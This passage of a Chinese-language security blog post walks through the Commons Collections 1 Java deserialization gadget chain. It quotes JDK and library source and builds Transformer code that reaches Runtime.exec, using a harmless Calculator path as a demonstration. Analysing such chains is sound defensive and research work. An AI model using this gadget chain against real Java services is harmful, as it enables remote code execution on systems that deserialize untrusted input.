+</span></span><span class="line"><span class="cl"><span class="n">exec</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">input</span><span class="o">);</span>
+</span></span></code></pre></div><p>但是我们主要到的是input的变量，我们要主动去做赋值，要知道服务器不可能会写一个给你，我们要在执行readObject的时候就有我们的input的内容，要解决传input值问题，我们的最希望的就是有一个方法可以在内部就帮我们传入危险的值。</p>
+<p>跟到这里，大家可能也会有点迷茫，我们重新回到我们最终目的：能被readObject利用到的。这里我们可以直接跳到AnnotationInvocationHandler这个类，这个JDK自带的，而且这个类的readObject重写了，同时也继承Serializable类：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Check to make sure that types have not evolved incompatibly
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="n">AnnotationType</span> <span class="n">annotationType</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">annotationType</span> <span class="o">=</span> <span class="n">AnnotationType</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span><span class="o">(</span><span class="n">IllegalArgumentException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// Class is no longer an annotation type; time to punch out
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">throw</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">InvalidObjectException</span><span class="o">(</span><span class="s">&#34;Non-annotation type in annotation serial stream&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;&gt;</span> <span class="n">memberTypes</span> <span class="o">=</span> <span class="n">annotationType</span><span class="o">.</span><span class="na">memberTypes</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// If there are annotation members without values, that
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// situation is handled by the invoke method.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValue</span> <span class="o">:</span> <span class="n">memberValues</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">memberValue</span><span class="o">.</span><span class="na">getKey</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">memberType</span> <span class="o">=</span> <span class="n">memberTypes</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">memberType</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>  <span class="c1">// i.e. member still exists
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">memberValue</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(!(</span><span class="n">memberType</span><span class="o">.</span><span class="na">isInstance</span><span class="o">(</span><span class="n">value</span><span class="o">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">                      <span class="n">value</span> <span class="k">instanceof</span> <span class="n">ExceptionProxy</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">memberValue</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">new</span> <span class="n">AnnotationTypeMismatchExceptionProxy</span><span class="o">(</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">value</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;[&#34;</span> <span class="o">+</span> <span class="n">value</span> <span class="o">+</span> <span class="s">&#34;]&#34;</span><span class="o">).</span><span class="na">setMember</span><span class="o">(</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">annotationType</span><span class="o">.</span><span class="na">members</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">)));</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>我们重点看下面这两句：</p>
+<p><code>Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()</code></p>
+<p><code>memberValue.setValue</code></p>
+<p>上面这些过程看不懂不要紧，继续往下走，把整个思路弄顺了先。我们知道执行反序列化后这里会把Map进行遍历，然后去执行赋值给<code>memberValue</code>的setValue方法。那有人在这里就迷惑了，<code>memberValue</code>又是怎么来的，我们这个变量是在创建AnnotationInvocationHandler对象的时候传进来的值，第一个是注解，第二个参数是Map，所以我们要把我们的恶意代码作为Map类型传给AnnotationInvocationHandler对象才能实现反序列化：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">class</span> <span class="nc">AnnotationInvocationHandler</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="n">6182022883658399397L</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">Annotation</span><span class="o">&gt;</span> <span class="n">type</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">final</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValues</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">AnnotationInvocationHandler</span><span class="o">(</span><span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">Annotation</span><span class="o">&gt;</span> <span class="n">type</span><span class="o">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValues</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">superInterfaces</span> <span class="o">=</span> <span class="n">type</span><span class="o">.</span><span class="na">getInterfaces</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(!</span><span class="n">type</span><span class="o">.</span><span class="na">isAnnotation</span><span class="o">()</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">            <span class="n">superInterfaces</span><span class="o">.</span><span class="na">length</span> <span class="o">!=</span> <span class="n">1</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">            <span class="n">superInterfaces</span><span class="o">[</span><span class="n">0</span><span class="o">]</span> <span class="o">!=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">annotation</span><span class="o">.</span><span class="na">Annotation</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">AnnotationFormatError</span><span class="o">(</span><span class="s">&#34;Attempt to create proxy for a non-annotation type.&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">type</span> <span class="o">=</span> <span class="n">type</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span> <span class="o">=</span> <span class="n">memberValues</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>接下来就要去找利用到setValue方法的类，因为在这里触发这个方法<code>memberValue.setValue</code>，我们只要从cc库中找到利用该方法的地方，我们右键寻找<code>find usages</code>，找到一个是map类型的类，为什么要找map类型呢，因为map类型的用得比较多，也比较广泛，我们看到<code>AbstractInputCheckedMapDecorator</code>类使用了该方法：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/2.png" alt="2"></p>
+<p>我们查看下<code>checkSetValue</code>的定义：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">AbstractInputCheckedMapDecorator</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">extends</span> <span class="n">AbstractMapDecorator</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="nf">AbstractInputCheckedMapDecorator</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="nf">AbstractInputCheckedMapDecorator</span><span class="o">(</span><span class="n">Map</span> <span class="n">map</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">(</span><span class="n">map</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//-----------------------------------------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * Hook method called when a value is being set using &lt;code&gt;setValue&lt;/code&gt;.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * &lt;p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * An implementation may validate the value and throw an exception
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * or it may transform the value into another object.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * &lt;p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * This implementation returns the input value.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param value  the value to check
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @throws UnsupportedOperationException if the map may not be changed by setValue
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @throws IllegalArgumentException if the specified value is invalid
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @throws ClassCastException if the class of the specified value is invalid
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @throws NullPointerException if the specified value is null and nulls are invalid
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="kd">abstract</span> <span class="n">Object</span> <span class="nf">checkSetValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">value</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="kt">boolean</span> <span class="nf">isSetValueChecking</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>我们使用ctrl+H键查找继承<code>AbstractInputCheckedMapDecorator</code>抽象类的<code>checkSetValue</code>方法，有什么我们可以利用到的，主要是能触发我们的transform的方法的，我们发现了两个类继承了它，其中在<code>TransformedMap</code>类中的checkSetValue有触发transform的方法：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/3.png" alt="3"></p>
+<p>从readObject走到这里，我们只需要把InvokerTransformer类赋值给valueTransformer就行了。我们看下TransformedMap类，也继承了Serializable类，但是构造函数事protected属性的，不能直接new。不过还是提供了decorate方法给我们创建对象，而且valueTransformer也可控。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TransformedMap</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">extends</span> <span class="n">AbstractInputCheckedMapDecorator</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="n">7023152376788900464L</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="kd">final</span> <span class="n">Transformer</span> <span class="n">keyTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="kd">final</span> <span class="n">Transformer</span> <span class="n">valueTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Map</span> <span class="nf">decorate</span><span class="o">(</span><span class="n">Map</span> <span class="n">map</span><span class="o">,</span> <span class="n">Transformer</span> <span class="n">keyTransformer</span><span class="o">,</span> <span class="n">Transformer</span> <span class="n">valueTransformer</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">new</span> <span class="n">TransformedMap</span><span class="o">(</span><span class="n">map</span><span class="o">,</span> <span class="n">keyTransformer</span><span class="o">,</span> <span class="n">valueTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="nf">TransformedMap</span><span class="o">(</span><span class="n">Map</span> <span class="n">map</span><span class="o">,</span> <span class="n">Transformer</span> <span class="n">keyTransformer</span><span class="o">,</span> <span class="n">Transformer</span> <span class="n">valueTransformer</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">(</span><span class="n">map</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">keyTransformer</span> <span class="o">=</span> <span class="n">keyTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">valueTransformer</span> <span class="o">=</span> <span class="n">valueTransformer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>所以代码可以这样写，for循环是直接用我们入口点的AnnotationInvocationHandler的readObject来写的。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Object</span> <span class="n">input</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;getRuntime&#34;</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">String</span> <span class="n">iMethodName</span> <span class="o">=</span> <span class="s">&#34;exec&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Class</span><span class="o">[]</span> <span class="n">iParamTypes</span> <span class="o">=</span> <span class="o">{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">Object</span><span class="o">[]</span> <span class="n">iArgs</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">InvokerTransformer</span> <span class="n">invokerTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="n">iMethodName</span><span class="o">,</span> <span class="n">iParamTypes</span><span class="o">,</span> <span class="n">iArgs</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Map</span> <span class="n">innerMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">innerMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;1111&#34;</span><span class="o">,</span><span class="s">&#34;test&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">outerMap</span> <span class="o">=</span>  <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">invokerTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValue</span> <span class="o">:</span> <span class="n">outerMap</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">memberValue</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">input</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>还是回到上面input的问题中，如果利用了AnnotationInvocationHandler类进行反序列化按道理是不用再处理input事情了的，所以我们需要找一个地方存放我们的input在内部。我们先来看下InvokerTransformer是继承Transformer类的，我们看下其他对象有没有合适和也有transform方法的，我们找到一个叫<code>ChainedTransformer</code>的类和<code>ConstantTransformer</code>类，里面就重写了transform方法：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/4.png" alt="4"></p>
+<p>我们要用到这两个类呢？</p>
+<ol>
+<li>
+<p>都是继承了Transformer</p>
+</li>
+<li>
+<p>都有重写transform方法</p>
+</li>
+</ol>
+<p>这Transformer类的功能就是将一个对象转换为另外一个对象，我们这里会用到的有：</p>
+<ul>
+<li>invokeTransformer（通过反射，返回一个对象）</li>
+<li>ChainedTransformer（把多个transformer连接成一条链，对一个对象依次通过链条内的每一个transformer进行转换）</li>
+<li>ConstantTransformer（把一个对象转化为常量，并返回）</li>
+</ul>
+<p>看完了还是懵的，到底对我们的反序列化有什么帮助？不急，我们先来看下它们是怎么处理的，在ConstantTransformer类中，new一个对象会赋值给iConstant变量，执行transform方法会直接返回这个对象，这样就完成了把一个对象转化为常量的过程：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="n">Object</span> <span class="n">constantToReturn</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">super</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">iConstant</span> <span class="o">=</span> <span class="n">constantToReturn</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * Transforms the input by ignoring it and returning the stored constant instead.
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param input  the input object which is ignored
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @return the stored constant
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">iConstant</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>接着到ChainedTransformer类，接收的参数是Transformer数组类型，然后将数组赋值给iTransformers变量。它就会将传入的iTransformers对象进行遍历和触发transform方法，然后返回Object给下一个transform方法这样就完成了把多个transformer连接成一条链，对一个对象依次通过链条内的每一个transformer进行转换：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="nf">ChainedTransformer</span><span class="o">(</span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">super</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">iTransformers</span> <span class="o">=</span> <span class="n">transformers</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * Transforms the input to result via each decorated transformer
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * 
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param object  the input object passed to the first transformer
+</span></span></span><span class="line"><span class="cl"><span class="cm">     * @return the transformed result
+</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">iTransformers</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">object</span> <span class="o">=</span> <span class="n">iTransformers</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">transform</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">object</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>那有什么用，看起来现在感觉有点乱的样子，不急，我们先把代码写出来，可以看到我们把Runtime对象放进ConstantTransformer对象里面，然后使用ChainedTransformer进行遍历整个Transformer数组，依次执行里面的transform方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()),</span>
+</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span> <span class="o">{</span><span class="s">&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;</span><span class="o">}),</span>
+</span></span><span class="line"><span class="cl"><span class="o">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Map</span> <span class="n">innerMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">innerMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;111&#34;</span><span class="o">,</span><span class="s">&#34;test&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">outerMap</span> <span class="o">=</span>  <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValue</span> <span class="o">:</span> <span class="n">outerMap</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">memberValue</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="s">&#34;test&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//上面还可以写成这样，outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式
+</span></span></span><span class="line"><span class="cl"><span class="c1">//outerMap.entrySet().iterator().next().setValue(&#34;test&#34;);
+</span></span></span></code></pre></div><p>在这里还可以想到一个很巧妙的地方就是ChainedTransformer的transform方法可以先把第一个ConstantTransformer处理过的Runtime对象赋值给下一个transform方法，也就是InvokerTransformer对象：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">iTransformers</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">object</span> <span class="o">=</span> <span class="n">iTransformers</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">transform</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">object</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>我们把上面的setValue串联起来那就是我们一开始这张图的过程一样：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/1.png" alt="1"></p>
+<p>现在我们就可以正式去从AnnotationInvocationHandler的readObject入口点进行反序列化了，因为AnnotationInvocationHandler的构造方法没有public，所以要使用反射的方式进行。而且还要看传入的参数，memberValues我们已经知道了，就是把outerMap变量放进来即可，第一参数是要传进来一个注释类型的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">  <span class="n">AnnotationInvocationHandler</span><span class="o">(</span><span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">Annotation</span><span class="o">&gt;</span> <span class="n">type</span><span class="o">,</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">memberValues</span><span class="o">)</span> <span class="o">{</span>
